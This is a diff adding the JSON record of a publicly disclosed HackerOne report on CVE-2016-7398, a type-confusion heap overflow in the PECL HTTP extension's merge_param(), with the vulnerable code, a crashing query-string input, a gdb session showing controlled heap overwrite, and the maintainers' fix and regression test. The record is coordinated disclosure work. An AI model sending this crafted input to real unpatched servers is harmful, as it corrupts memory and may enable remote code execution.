@@ -1,0 +1,320 @@
+{
+    "abilities": {
+        "can_manage_common_responses?": false, 
+        "can_manage_collaborators?": false, 
+        "can_reopen?": false, 
+        "can_ban_researcher?": false, 
+        "can_create_severity?": false, 
+        "can_assign_to_h1_triage?": false, 
+        "can_agree_on_going_public?": false, 
+        "assignable_team_member_groups": [], 
+        "can_view_credential_account_details?": false, 
+        "can_export?": false, 
+        "can_create_retest?": false, 
+        "can_assign_to_user?": false, 
+        "can_use_common_responses?": false, 
+        "can_hide_timeline?": false, 
+        "can_be_manually_disclosed?": false, 
+        "assignable_team_members": [], 
+        "can_clone?": false, 
+        "can_be_publicly_disclosed?": false, 
+        "can_close_comments?": false, 
+        "can_view_bounty_weights?": false, 
+        "can_suggest_bounty_amount?": false, 
+        "can_cancel_disclosure_request?": false, 
+        "can_redact?": false, 
+        "can_change_structured_scope?": false, 
+        "can_post_internal_comments?": false, 
+        "can_change_state?": false, 
+        "can_change_weakness?": false, 
+        "can_add_comment?": false, 
+        "can_reassign_to_team?": false, 
+        "can_change_title?": false, 
+        "can_award_bounty?": false, 
+        "can_award_swag?": false, 
+        "can_close?": false, 
+        "can_manage?": false
+    }, 
+    "comments_closed?": false, 
+    "substate": "resolved", 
+    "bug_reporter_agreed_on_going_public_at": "2017-05-06T08:21:23.749Z", 
+    "voters": [
+        "eveeez", 
+        "mga_bobo", 
+        "spetr0x"
+    ], 
+    "facebook_team?": false, 
+    "has_bounty?": true, 
+    "bounty_amount": "500.0", 
+    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
+    "original_report_id": null, 
+    "id": 172411, 
+    "can_view_team": true, 
+    "team_member_agreed_on_going_public_at": "2017-05-30T15:13:53.682Z", 
+    "vulnerability_information": "Since the original report is still marked as private in the PHP bug tracker please find the copy & pasted bug report below (edited for readability and to include correct bug tracker id). See the references section for a link to the issue in the PHP bug tracker!\n\nThe maintainer already fixed the issue in the public git repo using the proposed patch included in the original report.\n\nMitre assigned **CVE-2016-7398** for this issue.\n\n# Description\n\nThe url parsing functions of the PECL HTTP extension allow overflowing\na heap-based buffer with data originating from an arbitrary HTTP request.\nAffected is the `merge_param()` function in `php_http_params.c` that is called\nfrom `php_http_querystring_parse()`:  \n\nCode fragment from `merge_param()` in `php_http_params.c:491`:\n\n```c\nstatic void merge_param(HashTable *params, zval *zdata, ...)\n{\n/*[...]*/\n    while (Z_TYPE_P(zdata_ptr) == IS_ARRAY && (test_ptr = zend_hash_get_current_data(Z_ARRVAL_P(zdata_ptr)))) {\n        if (Z_TYPE_P(test_ptr) == IS_ARRAY) {\n            zval *tmp_ptr = ptr;\n    \n/*[...]*/           \n            } else {\n                if ((ptr = zend_hash_index_find(Z_ARRVAL_P(ptr), hkey.h))) {\n                    zdata_ptr = test_ptr;\n                } else if (hkey.h) {\n                    ptr = tmp_ptr;\n                    Z_TRY_ADDREF_P(test_ptr);\n/*[511]*/           ptr = zend_hash_index_update(Z_ARRVAL_P(ptr), hkey.h, test_ptr);\n/*[...]*/\n```\n\nIn line 511 `zend_hash_index_update()` is called with ptr used as an array\n(`Z_ARRVAL_P(ptr)`) without actually checking its type. Thus it was possible\nto call `zend_hash_index_update()` on a `zend_string` instead which obviously\nleads to memory corruption issues.\n\nThe sample request provided in this report uses this type confusion\nvulnerability to trigger an arbitrary heap overwrite. The actual overwrite\noccurs in `_zend_hash_index_add_or_update_i()`: \n\n```c\nstatic zend_always_inline zval *_zend_hash_index_add_or_update_i(HashTable *ht, zend_ulong h, zval *pData, uint32_t flag ZEND_FILE_LINE_DC)\n{\n/*[...]*/\nadd_to_hash:\n/*[...]*/\n    p = ht->arData + idx;\n    p->h = h;\t\t\t\t\t\t// <- heap overflow\n    p->key = NULL;\t\t\t\t\t// <- heap overflow\n/*[...]*/\n```\n\nBecause of the invalid pointer provided as HashTable `ht->arData` points\nto an unexpected memory location on the heap and not to the list of Buckets\nof an ordinary `HashTable`. So the two following assignments allow to write\narbitrary values (`hkey.h` and `NULL`) on the heap.\nAs it turned out `hkey.h` can be controlled with request data received from\nthe network.  \nThe attached proof of concept demonstrates that this flaw very likely allows\nfor remote code execution.\n\nThis vulnerability was found using `afl-fuzz`/`afl-utils`.\n\n# PoC\n\nSee the attached patch for the sample request in `bug73055.bin`.\n\n```\n$ cat http_querystring.php\n/*\n * http_querystring.php\n */\n<?php\n    $qs = new http\\QueryString(file_get_contents(\"bug73055.bin\"));\n?>\n$ ./configure --enable-raphf --enable-propro --with-http && make\n$ gdb ./sapi/cli/php\ngdb> b php_http_params.c:511\ngdb> r http_querystring.php\n    Breakpoint 1, merge_param (zdata=0x7fffffff9cf0, current_args=0x7fffffff9dd8, current_param=0x7fffffff9de0,\n    params=<optimized out>) at php_http_params.c:511\n    511\t\t\t\tptr = zend_hash_index_update(Z_ARRVAL_P(ptr), hkey.h, test_ptr);\ngdb> p ptr.u1.type_info\n    $1 = 6                      // <-- IS_STRING, incorrect type!\ngdb> b zend_hash.c:811\ngdb> c\n    Breakpoint 2, _zend_hash_index_add_or_update_i (flag=1, pData=0x7ffff425c6a0, h=16706, ht=0xf53dc0) at\n    zend_hash.c:811\n    811\t\tp->h = h;\t\t\t\t\t\t// <- heap overflow\ngdb> p &p->h\n    $2 = (zend_ulong *) 0x1091f40\ngdb> x/8gx 0x1091f20                    // heap before overflow\n    0x1091f20:\t0x000000006c72755c\t0x0000000000000021\n    0x1091f30:\t0x00007ffff5addb48\t0x0000000001092960\n    0x1091f40:\t0x0000000000000020\t0x0000000000000031 <-- heap meta-data (prev-size, size)\n    0x1091f50:\t0x0000070600000001\t0x800000017c9c614a\ngdb> ni 2\ngdb> x/8gx 0x1091f20                    // heap after overflow\n    0x1091f20:\t0x000000006c72755c\t0x0000000000000021\n    0x1091f30:\t0x00007ffff5addb48\t0x0000000001092960\n    0x1091f40:\t0x0000000000004142\t0x0000000000000000 <-- heap meta-data overwritten*\n    0x1091f50:\t0x0000070600000001\t0x800000017c9c614a\n    /*\n     * (*) 0x4142 originates from bug73055.bin offset 0x59\n     * The numeric string '16706' is converted into the integer\n     * it is representing 0x4142 (see sanitize_dimension()).\n     */\ngdb> bt                                 // for the record\n    #0  _zend_hash_index_add_or_update_i (flag=1, pData=0x7ffff425c6a0, h=16706, ht=0xf53dc0) at zend_hash.c:815\n    #1  _zend_hash_index_update (ht=0xf53dc0, h=16706, pData=pData@entry=0x7ffff425c6a0) at zend_hash.c:838\n    #2  0x00000000006b032b in merge_param (zdata=0x7fffffff9cf0, current_args=0x7fffffff9dd8, current_param=0x7fffffff9de0, params=<optimized out>) at php_http_params.c:511\n    #3  push_param (params=<optimized out>, state=<optimized out>, opts=<optimized out>) at php_http_params.c:607\n    #4  0x00000000006b2475 in php_http_params_parse (params=params@entry=0x7ffff42023f0, opts=opts@entry=0x7fffffff9e80) at php_http_params.c:755\n    #5  0x00000000006b5479 in php_http_querystring_parse (ht=0x7ffff42023f0, str=str@entry=0x7ffff4282018 '[' <repeats 27 times>, \"]]]]\", '[' <repeats 38 times>, \"&%C0[]E[=&2[&%C0[]E[16706[*[\", len=<optimized out>) at php_http_querystring.c:224\n    #6  0x00000000006b552c in php_http_querystring_update (qarray=qarray@entry=0x7fffffff9f80, params=params@entry=0x7ffff4213130, outstring=outstring@entry=0x0) at php_http_querystring.c:268\n    #7  0x00000000006b6029 in php_http_querystring_set (flags=0, params=0x7ffff4213130, instance=0x7ffff4213100) at php_http_querystring.c:49\n    #8  zim_HttpQueryString___construct (execute_data=<optimized out>, return_value=<optimized out>) at php_http_querystring.c:365\n    #9  0x00000000007b0a93 in ZEND_DO_FCALL_SPEC_RETVAL_UNUSED_HANDLER () at zend_vm_execute.h:970\n    [...]\ngdb> dis 1 2\ngdb> c\n    Fatal error: Uncaught http\\Exception\\BadQueryStringException: http\\QueryString::__construct(): Max input nesting level of 64 exceeded in http_querystr.php:5\n    Stack trace:\n    #0 http_querystr.php(5): http\\QueryString->__construct('[[[[[[[[[[[[[[[...')\n    #1 {main}\n    \n    Next \u0001\n      thrown in http_querystr.php on line 5\n    *** Error in `sapi/cli/php': free(): invalid pointer: 0x0000000001091f50 ***\n    Program received signal SIGABRT, Aborted.\n    0x00007ffff577804f in raise () from /usr/lib/libc.so.6\n```\n\n# Patch\n\nAfter careful review by the project maintainers the following patch may be used\nto fix the reported issue. \n\n    From 34ae784c44be4a60157947f8ccc8c918e9b6ba40 Mon Sep 17 00:00:00 2001\n    From: rc0r <hlt99@blinkenshell.org>\n    Date: Fri, 9 Sep 2016 11:31:57 +0200\n    Subject: [PATCH] Type confusion vulnerability in merge_param() (#73055) fixed\n    \n    ---\n     src/php_http_params.c   |  2 +-\n     tests/bug73055.phpt     | 25 +++++++++++++++++++++++++\n     tests/data/bug73055.bin |  1 +\n     3 files changed, 27 insertions(+), 1 deletion(-)\n     create mode 100644 tests/bug73055.phpt\n     create mode 100644 tests/data/bug73055.bin\n    \n    diff --git a/src/php_http_params.c b/src/php_http_params.c\n    index 8988f43..0846f47 100644\n    --- a/src/php_http_params.c\n    +++ b/src/php_http_params.c\n    @@ -489,7 +489,7 @@ static void merge_param(HashTable *params, zval *zdata, zval **current_param, zv\n                zval *test_ptr;\n     \n                while (Z_TYPE_P(zdata_ptr) == IS_ARRAY && (test_ptr = zend_hash_get_current_data(Z_ARRVAL_P(zdata_ptr)))) {\n    -\t\t\t\tif (Z_TYPE_P(test_ptr) == IS_ARRAY) {\n    +\t\t\t\tif ((Z_TYPE_P(test_ptr) == IS_ARRAY) && (Z_TYPE_P(ptr) == IS_ARRAY)) {\n                        zval *tmp_ptr = ptr;\n     \n                        /* now find key in ptr */\n    diff --git a/tests/bug73055.phpt b/tests/bug73055.phpt\n    new file mode 100644\n    index 0000000..260e823\n    --- /dev/null\n    +++ b/tests/bug73055.phpt\n    @@ -0,0 +1,25 @@\n    +--TEST--\n    +Type confusion vulnerability in merge_param()\n    +--SKIPIF--\n    +<?php\n    +include \"skipif.inc\";\n    +?>\n    +--FILE--\n    +<?php\n    +\n    +echo \"Test\\n\";\n    +try {\n    +\techo new http\\QueryString(file_get_contents(__DIR__.\"/data/bug73055.bin\")); // <- put provided sample into correct location\n    +} catch (Exception $e) {\n    +\techo $e;\n    +}\n    +?>\n    +\n    +===DONE===\n    +--EXPECTF--\n    +Test\n    +%r(exception ')?%rhttp\\Exception\\BadQueryStringException%r(' with message '|: )%rhttp\\QueryString::__construct(): Max input nesting level of 64 exceeded in %sbug73055.php:5\n    +Stack trace:\n    +#0 %sbug73055.php(5): http\\QueryString->__construct('[[[[[[[[[[[[[[[...')\n    +#1 {main}\n    +===DONE===\n    \\ No newline at end of file\n    diff --git a/tests/data/bug73055.bin b/tests/data/bug73055.bin\n    new file mode 100644\n    index 0000000..ad2dd9f\n    --- /dev/null\n    +++ b/tests/data/bug73055.bin\n    @@ -0,0 +1 @@\n    +[[[[[[[[[[[[[[[[[[[[[[[[[[[]]]][[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[&%C0[]E[=&2[&%C0[]E[16706[*[\n    \\ No newline at end of file\n    -- \n    2.9.3\n\n# Versions known to be affected\n\npecl-http extension versions up to and including:\n\n* 3.1.0beta2 (PHP 7)\n* 2.6.0beta2 (PHP 5)\n\n\n# Timeline\n\n2016-09-09  Initial report to PHP bug tracker (#73055)\n2016-09-12  Issue fixed in git repository, CVE requested\n2016-09-13  Mitre assigned CVE-2016-7398\n\n\n# References\n\nhttps://bugs.php.net/bug.php?id=73055\nhttps://github.com/m6w6/ext-http/commit/17137d4ab1ce81a2cee0fae842340a344ef3da83\nhttp://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-7398\n", 
+    "activity_page_count": 1, 
+    "severity": {
+        "rating": "low", 
+        "author_type": "Team"
+    }, 
+    "title": "Heap overflow caused by type confusion vulnerability in merge_param()", 
+    "is_member_of_team?": null, 
+    "vote_count": 3, 
+    "summaries": [
+        {
+            "category": "team", 
+            "can_create?": false, 
+            "can_view?": true
+        }, 
+        {
+            "category": "researcher", 
+            "can_create?": false, 
+            "can_view?": true
+        }
+    ], 
+    "structured_scope": null, 
+    "allow_singular_disclosure_at": "2017-06-05T08:21:23.798Z", 
+    "state": "Closed", 
+    "cve_ids": [], 
+    "activity_page_number": 1, 
+    "readable_substate": "Resolved", 
+    "public": true, 
+    "formatted_bounty": "$500", 
+    "singular_disclosure_disabled": false, 
+    "activities": [
+        {
+            "automated_response": false, 
+            "created_at": "2016-12-03T20:56:06.433Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2016-12-03T20:56:06.433Z", 
+            "actor": {
+                "username": "arice", 
+                "url": "/arice", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/020/74e2a8a31fee27a0c9b3d1d90dd64f4e38b2fb1c_medium.jpeg?1466604112"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "ibb-php", 
+            "message": "Same question as #174069", 
+            "markdown_message": "<p>Same question as <a href=\"/reports/174069\">#174069</a></p>\n", 
+            "type": "Activities::BugNeedsMoreInfo", 
+            "id": 1339069, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2016-12-03T21:58:51.405Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2016-12-03T21:58:51.405Z", 
+            "actor": {
+                "username": "rc0r", 
+                "url": "/rc0r", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/017/153/fba7b238959b21ab47c816b08fcd463ce880a11f_medium.png?1457542865"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "ibb-php", 
+            "message": "Same answer as #174069. Only a PHP bug tracker permission issue neither Mike nor I can resolve.", 
+            "markdown_message": "<p>Same answer as <a href=\"/reports/174069\">#174069</a>. Only a PHP bug tracker permission issue neither Mike nor I can resolve.</p>\n", 
+            "type": "Activities::BugNew", 
+            "id": 1339196, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2016-12-03T22:15:54.748Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2016-12-03T22:15:54.748Z", 
+            "actor": {
+                "username": "arice", 
+                "url": "/arice", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/020/74e2a8a31fee27a0c9b3d1d90dd64f4e38b2fb1c_medium.jpeg?1466604112"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "additional_data": {
+                "new_severity": "Low", 
+                "old_severity": null
+            }, 
+            "team_handle": "ibb-php", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::ReportSeverityUpdated", 
+            "id": 1339220, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "reporter": {
+                "username": "rc0r", 
+                "url": "/rc0r"
+            }, 
+            "created_at": "2016-12-03T22:16:02.898Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2016-12-03T22:16:02.898Z", 
+            "actor": {
+                "username": "arice", 
+                "url": "/arice", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/020/74e2a8a31fee27a0c9b3d1d90dd64f4e38b2fb1c_medium.jpeg?1466604112"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "ibb-php", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::BugResolved", 
+            "id": 1339221, 
+            "genius_execution_id": null
+        }, 
+        {
+            "bounty_currency": "usd", 
+            "automated_response": false, 
+            "created_at": "2016-12-03T22:16:08.630Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2016-12-03T22:16:08.630Z", 
+            "actor": {
+                "url": "/ibb-php", 
+                "profile": {
+                    "name": "PHP (IBB)"
+                }, 
+                "ibb": true, 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/029/991fb39ba898696eb6ae62521c49b292b2a9cf95_medium.png?1385119730"
+                }
+            }, 
+            "team_handle": "ibb-php", 
+            "bounty_amount": "500.0", 
+            "collaborator": {
+                "username": "rc0r", 
+                "url": "/rc0r"
+            }, 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::BountyAwarded", 
+            "id": 1339222, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-05-06T08:21:23.770Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-05-06T08:21:23.770Z", 
+            "actor": {
+                "username": "rc0r", 
+                "url": "/rc0r", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/017/153/fba7b238959b21ab47c816b08fcd463ce880a11f_medium.png?1457542865"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "ibb-php", 
+            "first_to_agree": true, 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::AgreedOnGoingPublic", 
+            "id": 1657979, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-05-30T15:13:53.708Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-05-30T15:13:53.708Z", 
+            "actor": {
+                "username": "arice", 
+                "url": "/arice", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/020/74e2a8a31fee27a0c9b3d1d90dd64f4e38b2fb1c_medium.jpeg?1466604112"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "ibb-php", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::AgreedOnGoingPublic", 
+            "id": 1709816, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-05-30T15:13:53.762Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-05-30T15:13:53.762Z", 
+            "actor": {
+                "username": "arice", 
+                "url": "/arice", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/020/74e2a8a31fee27a0c9b3d1d90dd64f4e38b2fb1c_medium.jpeg?1466604112"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "ibb-php", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::ReportBecamePublic", 
+            "id": 1709817, 
+            "genius_execution_id": null
+        }
+    ], 
+    "in_validation?": false, 
+    "is_participant": false, 
+    "singular_disclosure_allowed": true, 
+    "reporter": {
+        "username": "rc0r", 
+        "hacker_mediation": false, 
+        "hackerone_triager": false, 
+        "disabled": false, 
+        "url": "/rc0r", 
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/000/017/153/eb232471153ab2f2efb7a0df7cc970b1e9627d1a_small.png?1457542865"
+        }, 
+        "is_me?": false
+    }, 
+    "weakness": {
+        "id": 2, 
+        "name": "Memory Corruption - Generic"
+    }, 
+    "is_external_bug": false, 
+    "visibility": "full", 
+    "allow_singular_disclosure_after": -47485000.571219586, 
+    "disclosed_at": "2017-05-30T15:13:53.742Z", 
+    "stage": 4, 
+    "url": "https://hackerone.com/reports/172411", 
+    "created_at": "2016-09-27T14:03:13.923Z", 
+    "original_report_url": null, 
+    "vulnerability_information_html": "<p>Since the original report is still marked as private in the PHP bug tracker please find the copy &amp; pasted bug report below (edited for readability and to include correct bug tracker id). See the references section for a link to the issue in the PHP bug tracker!</p>\n\n<p>The maintainer already fixed the issue in the public git repo using the proposed patch included in the original report.</p>\n\n<p>Mitre assigned <strong>CVE-2016-7398</strong> for this issue.</p>\n\n<h1 id=\"description\">Description</h1>\n\n<p>The url parsing functions of the PECL HTTP extension allow overflowing<br>\na heap-based buffer with data originating from an arbitrary HTTP request.<br>\nAffected is the <code>merge_param()</code> function in <code>php_http_params.c</code> that is called<br>\nfrom <code>php_http_querystring_parse()</code>:  </p>\n\n<p>Code fragment from <code>merge_param()</code> in <code>php_http_params.c:491</code>:</p>\n<pre class=\"highlight c\"><code><span class=\"k\">static</span> <span class=\"kt\">void</span> <span class=\"nf\">merge_param</span><span class=\"p\">(</span><span class=\"n\">HashTable</span> <span class=\"o\">*</span><span class=\"n\">params</span><span class=\"p\">,</span> <span class=\"n\">zval</span> <span class=\"o\">*</span><span class=\"n\">zdata</span><span class=\"p\">,</span> <span class=\"p\">...)</span>\n<span class=\"p\">{</span>\n<span class=\"cm\">/*[...]*/</span>\n    <span class=\"k\">while</span> <span class=\"p\">(</span><span class=\"n\">Z_TYPE_P</span><span class=\"p\">(</span><span class=\"n\">zdata_ptr</span><span class=\"p\">)</span> <span class=\"o\">==</span> <span class=\"n\">IS_ARRAY</span> <span class=\"o\">&amp;&amp;</span> <span class=\"p\">(</span><span class=\"n\">test_ptr</span> <span class=\"o\">=</span> <span class=\"n\">zend_hash_get_current_data</span><span class=\"p\">(</span><span class=\"n\">Z_ARRVAL_P</span><span class=\"p\">(</span><span class=\"n\">zdata_ptr</span><span class=\"p\">))))</span> <span class=\"p\">{</span>\n        <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">Z_TYPE_P</span><span class=\"p\">(</span><span class=\"n\">test_ptr</span><span class=\"p\">)</span> <span class=\"o\">==</span> <span class=\"n\">IS_ARRAY</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n            <span class=\"n\">zval</span> <span class=\"o\">*</span><span class=\"n\">tmp_ptr</span> <span class=\"o\">=</span> <span class=\"n\">ptr</span><span class=\"p\">;</span>\n\n<span class=\"cm\">/*[...]*/</span>           \n            <span class=\"p\">}</span> <span class=\"k\">else</span> <span class=\"p\">{</span>\n                <span class=\"k\">if</span> <span class=\"p\">((</span><span class=\"n\">ptr</span> <span class=\"o\">=</span> <span class=\"n\">zend_hash_index_find</span><span class=\"p\">(</span><span class=\"n\">Z_ARRVAL_P</span><span class=\"p\">(</span><span class=\"n\">ptr</span><span class=\"p\">),</span> <span class=\"n\">hkey</span><span class=\"p\">.</span><span class=\"n\">h</span><span class=\"p\">)))</span> <span class=\"p\">{</span>\n                    <span class=\"n\">zdata_ptr</span> <span class=\"o\">=</span> <span class=\"n\">test_ptr</span><span class=\"p\">;</span>\n                <span class=\"p\">}</span> <span class=\"k\">else</span> <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">hkey</span><span class=\"p\">.</span><span class=\"n\">h</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n                    <span class=\"n\">ptr</span> <span class=\"o\">=</span> <span class=\"n\">tmp_ptr</span><span class=\"p\">;</span>\n                    <span class=\"n\">Z_TRY_ADDREF_P</span><span class=\"p\">(</span><span class=\"n\">test_ptr</span><span class=\"p\">);</span>\n<span class=\"cm\">/*[511]*/</span>           <span class=\"n\">ptr</span> <span class=\"o\">=</span> <span class=\"n\">zend_hash_index_update</span><span class=\"p\">(</span><span class=\"n\">Z_ARRVAL_P</span><span class=\"p\">(</span><span class=\"n\">ptr</span><span class=\"p\">),</span> <span class=\"n\">hkey</span><span class=\"p\">.</span><span class=\"n\">h</span><span class=\"p\">,</span> <span class=\"n\">test_ptr</span><span class=\"p\">);</span>\n<span class=\"cm\">/*[...]*/</span>\n</code></pre>\n<p>In line 511 <code>zend_hash_index_update()</code> is called with ptr used as an array<br>\n(<code>Z_ARRVAL_P(ptr)</code>) without actually checking its type. Thus it was possible<br>\nto call <code>zend_hash_index_update()</code> on a <code>zend_string</code> instead which obviously<br>\nleads to memory corruption issues.</p>\n\n<p>The sample request provided in this report uses this type confusion<br>\nvulnerability to trigger an arbitrary heap overwrite. The actual overwrite<br>\noccurs in <code>_zend_hash_index_add_or_update_i()</code>: </p>\n<pre class=\"highlight c\"><code><span class=\"k\">static</span> <span class=\"n\">zend_always_inline</span> <span class=\"n\">zval</span> <span class=\"o\">*</span><span class=\"nf\">_zend_hash_index_add_or_update_i</span><span class=\"p\">(</span><span class=\"n\">HashTable</span> <span class=\"o\">*</span><span class=\"n\">ht</span><span class=\"p\">,</span> <span class=\"n\">zend_ulong</span> <span class=\"n\">h</span><span class=\"p\">,</span> <span class=\"n\">zval</span> <span class=\"o\">*</span><span class=\"n\">pData</span><span class=\"p\">,</span> <span class=\"kt\">uint32_t</span> <span class=\"n\">flag</span> <span class=\"n\">ZEND_FILE_LINE_DC</span><span class=\"p\">)</span>\n<span class=\"p\">{</span>\n<span class=\"cm\">/*[...]*/</span>\n<span class=\"nl\">add_to_hash:</span>\n<span class=\"cm\">/*[...]*/</span>\n    <span class=\"n\">p</span> <span class=\"o\">=</span> <span class=\"n\">ht</span><span class=\"o\">-&gt;</span><span class=\"n\">arData</span> <span class=\"o\">+</span> <span class=\"n\">idx</span><span class=\"p\">;</span>\n    <span class=\"n\">p</span><span class=\"o\">-&gt;</span><span class=\"n\">h</span> <span class=\"o\">=</span> <span class=\"n\">h</span><span class=\"p\">;</span>                       <span class=\"c1\">// &lt;- heap overflow\n</span>    <span class=\"n\">p</span><span class=\"o\">-&gt;</span><span class=\"n\">key</span> <span class=\"o\">=</span> <span class=\"nb\">NULL</span><span class=\"p\">;</span>                  <span class=\"c1\">// &lt;- heap overflow\n</span><span class=\"cm\">/*[...]*/</span>\n</code></pre>\n<p>Because of the invalid pointer provided as HashTable <code>ht-&gt;arData</code> points<br>\nto an unexpected memory location on the heap and not to the list of Buckets<br>\nof an ordinary <code>HashTable</code>. So the two following assignments allow to write<br>\narbitrary values (<code>hkey.h</code> and <code>NULL</code>) on the heap.<br>\nAs it turned out <code>hkey.h</code> can be controlled with request data received from<br>\nthe network.<br><br>\nThe attached proof of concept demonstrates that this flaw very likely allows<br>\nfor remote code execution.</p>\n\n<p>This vulnerability was found using <code>afl-fuzz</code>/<code>afl-utils</code>.</p>\n\n<h1 id=\"poc\">PoC</h1>\n\n<p>See the attached patch for the sample request in <code>bug73055.bin</code>.</p>\n<pre class=\"highlight plaintext\"><code>$ cat http_querystring.php\n/*\n * http_querystring.php\n */\n&lt;?php\n    $qs = new http\\QueryString(file_get_contents(&quot;bug73055.bin&quot;));\n?&gt;\n$ ./configure --enable-raphf --enable-propro --with-http &amp;&amp; make\n$ gdb ./sapi/cli/php\ngdb&gt; b php_http_params.c:511\ngdb&gt; r http_querystring.php\n    Breakpoint 1, merge_param (zdata=0x7fffffff9cf0, current_args=0x7fffffff9dd8, current_param=0x7fffffff9de0,\n    params=&lt;optimized out&gt;) at php_http_params.c:511\n    511             ptr = zend_hash_index_update(Z_ARRVAL_P(ptr), hkey.h, test_ptr);\ngdb&gt; p ptr.u1.type_info\n    $1 = 6                      // &lt;-- IS_STRING, incorrect type!\ngdb&gt; b zend_hash.c:811\ngdb&gt; c\n    Breakpoint 2, _zend_hash_index_add_or_update_i (flag=1, pData=0x7ffff425c6a0, h=16706, ht=0xf53dc0) at\n    zend_hash.c:811\n    811     p-&gt;h = h;                       // &lt;- heap overflow\ngdb&gt; p &amp;p-&gt;h\n    $2 = (zend_ulong *) 0x1091f40\ngdb&gt; x/8gx 0x1091f20                    // heap before overflow\n    0x1091f20:  0x000000006c72755c  0x0000000000000021\n    0x1091f30:  0x00007ffff5addb48  0x0000000001092960\n    0x1091f40:  0x0000000000000020  0x0000000000000031 &lt;-- heap meta-data (prev-size, size)\n    0x1091f50:  0x0000070600000001  0x800000017c9c614a\ngdb&gt; ni 2\ngdb&gt; x/8gx 0x1091f20                    // heap after overflow\n    0x1091f20:  0x000000006c72755c  0x0000000000000021\n    0x1091f30:  0x00007ffff5addb48  0x0000000001092960\n    0x1091f40:  0x0000000000004142  0x0000000000000000 &lt;-- heap meta-data overwritten*\n    0x1091f50:  0x0000070600000001  0x800000017c9c614a\n    /*\n     * (*) 0x4142 originates from bug73055.bin offset 0x59\n     * The numeric string &#39;16706&#39; is converted into the integer\n     * it is representing 0x4142 (see sanitize_dimension()).\n     */\ngdb&gt; bt                                 // for the record\n    #0  _zend_hash_index_add_or_update_i (flag=1, pData=0x7ffff425c6a0, h=16706, ht=0xf53dc0) at zend_hash.c:815\n    #1  _zend_hash_index_update (ht=0xf53dc0, h=16706, pData=pData@entry=0x7ffff425c6a0) at zend_hash.c:838\n    #2  0x00000000006b032b in merge_param (zdata=0x7fffffff9cf0, current_args=0x7fffffff9dd8, current_param=0x7fffffff9de0, params=&lt;optimized out&gt;) at php_http_params.c:511\n    #3  push_param (params=&lt;optimized out&gt;, state=&lt;optimized out&gt;, opts=&lt;optimized out&gt;) at php_http_params.c:607\n    #4  0x00000000006b2475 in php_http_params_parse (params=params@entry=0x7ffff42023f0, opts=opts@entry=0x7fffffff9e80) at php_http_params.c:755\n    #5  0x00000000006b5479 in php_http_querystring_parse (ht=0x7ffff42023f0, str=str@entry=0x7ffff4282018 &#39;[&#39; &lt;repeats 27 times&gt;, &quot;]]]]&quot;, &#39;[&#39; &lt;repeats 38 times&gt;, &quot;&amp;%C0[]E[=&amp;2[&amp;%C0[]E[16706[*[&quot;, len=&lt;optimized out&gt;) at php_http_querystring.c:224\n    #6  0x00000000006b552c in php_http_querystring_update (qarray=qarray@entry=0x7fffffff9f80, params=params@entry=0x7ffff4213130, outstring=outstring@entry=0x0) at php_http_querystring.c:268\n    #7  0x00000000006b6029 in php_http_querystring_set (flags=0, params=0x7ffff4213130, instance=0x7ffff4213100) at php_http_querystring.c:49\n    #8  zim_HttpQueryString___construct (execute_data=&lt;optimized out&gt;, return_value=&lt;optimized out&gt;) at php_http_querystring.c:365\n    #9  0x00000000007b0a93 in ZEND_DO_FCALL_SPEC_RETVAL_UNUSED_HANDLER () at zend_vm_execute.h:970\n    [...]\ngdb&gt; dis 1 2\ngdb&gt; c\n    Fatal error: Uncaught http\\Exception\\BadQueryStringException: http\\QueryString::__construct(): Max input nesting level of 64 exceeded in http_querystr.php:5\n    Stack trace:\n    #0 